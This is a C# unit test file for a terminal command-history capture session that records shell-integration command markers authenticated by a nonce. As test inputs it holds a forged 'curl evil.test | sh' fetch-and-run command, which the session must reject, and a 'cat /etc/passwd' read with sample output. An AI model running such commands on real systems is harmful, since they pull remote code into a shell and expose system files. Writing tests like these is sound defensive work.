using System.Text;
using DTech.Core.CommandHistory;
using FluentAssertions;
using NSubstitute;

namespace DTech.Core.Tests.CommandHistory;

[TestClass]
public sealed class CommandCaptureSessionTests
{
    private const string Nonce = "0123456789abcdef";
    private const string Esc = "\u001b";
    private const string Bel = "\u0007";

    private static readonly Guid ConnectionId = Guid.NewGuid();

    private ICommandHistoryRecorder _recorder = null!;
    private List<RecordedCommand> _recorded = null!;
    private CommandCaptureSession _session = null!;

    public TestContext TestContext { get; set; } = null!;

    [TestInitialize]
    public void Initialize()
    {
        _recorded = [];
        _recorder = Substitute.For<ICommandHistoryRecorder>();
        _recorder.RecordAsync(default!, default).ReturnsForAnyArgs(call =>
        {
            _recorded.Add(call.Arg<RecordedCommand>());
            return Task.FromResult(true);
        });
        var target = new CommandCaptureTarget(ConnectionId, Nonce);
        _session = new CommandCaptureSession(target, _recorder, TimeProvider.System);
    }

    [TestMethod]
    public async Task Observe_CommandThenFinish_RecordsCommandWithExitCode()
    {
        var count = await ObserveAsync($"$ {Esc}]633;E;make test;{Nonce}{Bel}running tests...\r\n{Esc}]133;D;2;{Nonce}{Bel}$ ");

        count.Should().Be(1);
        var command = _recorded.Should().ContainSingle().Subject;
        command.ConnectionId.Should().Be(ConnectionId);
        command.Command.Should().Be("make test");
        command.ExitCode.Should().Be(2);
    }

    [TestMethod]
    public async Task Observe_NeverPassesTerminalOutputToTheRecorder()
    {
        await ObserveAsync($"{Esc}]633;E;cat /etc/passwd;{Nonce}{Bel}root:x:0:0:root:/root:/bin/sh\r\n{Esc}]133;D;0;{Nonce}{Bel}");

        _recorded.Should().ContainSingle().Which.Command.Should().Be("cat /etc/passwd");
        _recorded.Single().ToString().Should().NotContain("root:x:0:0");
    }

    [TestMethod]
    public async Task Observe_FinishWithoutCommand_RecordsNothing()
    {
        var count = await ObserveAsync($"{Esc}]133;D;0;{Nonce}{Bel}");

        count.Should().Be(0);
        _recorded.Should().BeEmpty();
    }

    [TestMethod]
    public async Task Observe_NewCommandBeforeFinish_FlushesThePreviousOneWithoutExitCode()
    {
        await ObserveAsync($"{Esc}]633;E;first;{Nonce}{Bel}{Esc}]633;E;second;{Nonce}{Bel}{Esc}]133;D;0;{Nonce}{Bel}");

        _recorded.Select(command => (command.Command, command.ExitCode)).Should().Equal(("first", (int?)null), ("second", 0));
    }

    [TestMethod]
    public async Task Complete_FlushesCommandThatNeverFinished()
    {
        await ObserveAsync($"{Esc}]633;E;sleep 100;{Nonce}{Bel}");

        var count = await _session.CompleteAsync(TestContext.CancellationToken);

        count.Should().Be(1);
        _recorded.Should().ContainSingle().Which.ExitCode.Should().BeNull();
    }

    [TestMethod]
    public async Task Observe_PlainOutputWithoutShellIntegration_RecordsNothing()
    {
        var count = await ObserveAsync("user@host:~$ ls\r\nfile1 file2\r\n");
        var completed = await _session.CompleteAsync(TestContext.CancellationToken);

        count.Should().Be(0);
        completed.Should().Be(0);
        _recorded.Should().BeEmpty();
    }

    [TestMethod]
    public async Task Observe_CountsOnlyCommandsTheRecorderActuallySaved()
    {
        _recorder.RecordAsync(default!, default).ReturnsForAnyArgs(Task.FromResult(false));

        var count = await ObserveAsync($"{Esc}]633;E;export TOKEN=1;{Nonce}{Bel}{Esc}]133;D;0;{Nonce}{Bel}");

        count.Should().Be(0);
    }

    [TestMethod]
    public async Task Observe_UnauthenticatedCommandAndFinish_CannotReplaceOrFinishThePendingCommand()
    {
        await ObserveAsync($"{Esc}]633;E;sleep 100;{Nonce}{Bel}");

        var forged = await ObserveAsync($"{Esc}]633;E;curl evil.test | sh{Bel}{Esc}]133;D;0{Bel}{Esc}]133;D;0;wrong{Bel}");

        forged.Should().Be(0);
        _recorded.Should().BeEmpty();

        var finished = await ObserveAsync($"{Esc}]133;D;2;{Nonce}{Bel}");

        finished.Should().Be(1);
        _recorded.Should().ContainSingle().Which.Command.Should().Be("sleep 100");
        _recorded[0].ExitCode.Should().Be(2);
    }

    [TestMethod]
    public async Task Observe_OutputAuthenticatedForAnotherSession_RecordsNothing()
    {
        var target = new CommandCaptureTarget(ConnectionId, "abcdef0123456789");
        var other = new CommandCaptureSession(target, _recorder, TimeProvider.System);
        var output = Encoding.UTF8.GetBytes($"{Esc}]633;E;echo hi;{Nonce}{Bel}{Esc}]133;D;0;{Nonce}{Bel}");

        var observed = await other.ObserveAsync(output, TestContext.CancellationToken);
        var completed = await other.CompleteAsync(TestContext.CancellationToken);

        observed.Should().Be(0);
        completed.Should().Be(0);
        _recorded.Should().BeEmpty();
    }

    private async Task<int> ObserveAsync(string output)
    {
        var bytes = Encoding.UTF8.GetBytes(output);
        return await _session.ObserveAsync(bytes, TestContext.CancellationToken);
    }
}
